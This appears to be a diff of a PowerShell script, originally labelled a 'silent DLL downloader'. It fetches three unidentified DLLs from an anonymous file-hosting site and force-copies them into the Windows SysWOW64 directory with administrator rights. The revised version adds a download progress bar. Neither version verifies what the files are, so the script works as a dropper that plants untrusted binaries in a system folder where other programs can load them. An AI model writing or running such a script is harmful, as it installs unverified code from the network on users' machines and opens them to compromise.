@@ -1,22 +1,40 @@
-# Silent DLL downloader from Catbox + copy to SysWOW64
-# Run as Administrator
+Add-Type -AssemblyName System.Windows.Forms
 
-$dlls = @(
+$downloads = @(
     @{ Name = "file1.dll"; Url = "https://files.catbox.moe/77pg84.dll" },
     @{ Name = "file2.dll"; Url = "https://files.catbox.moe/enco8e.dll" },
     @{ Name = "file3.dll"; Url = "https://files.catbox.moe/jmp14d.dll" }
 )
 
-$temp = "$env:TEMP\CatboxDLLs"
-New-Item -ItemType Directory -Path $temp -Force | Out-Null
+$webclient = New-Object System.Net.WebClient
 
-foreach ($dll in $dlls) {
-    $outPath = Join-Path $temp $dll.Name
-    Invoke-WebRequest -Uri $dll.Url -OutFile $outPath -UseBasicParsing
+$progressForm = New-Object Windows.Forms.Form
+$progressForm.Text = "Downloading Files..."
+$progressForm.Width = 400
+$progressBar = New-Object Windows.Forms.ProgressBar
+$progressBar.Style = 'Continuous'
+$progressBar.Minimum = 0
+$progressBar.Maximum = 100
+$progressBar.Dock = 'Fill'
+$progressForm.Controls.Add($progressBar)
+
+$webclient.DownloadProgressChanged += {
+    param($sender, $e)
+    $progressBar.Value = $e.ProgressPercentage
 }
 
-foreach ($dll in $dlls) {
-    Copy-Item -Path (Join-Path $temp $dll.Name) -Destination "C:\Windows\SysWOW64\$($dll.Name)" -Force
+$webclient.DownloadFileCompleted += {
+    param($sender, $e)
+    $progressForm.Close()
 }
 
-[System.Windows.MessageBox]::Show("All DLLs downloaded and installed successfully.", "Done", "OK", "Information")
+$destDir = "$env:windir\SysWOW64"
+
+foreach ($file in $downloads) {
+    $local = Join-Path -Path $env:TEMP -ChildPath $file.Name
+    $webclient.DownloadFileAsync($file.Url, $local)
+
+    $progressForm.ShowDialog()
+
+    Copy-Item $local -Destination (Join-Path $destDir $file.Name) -Force
+}
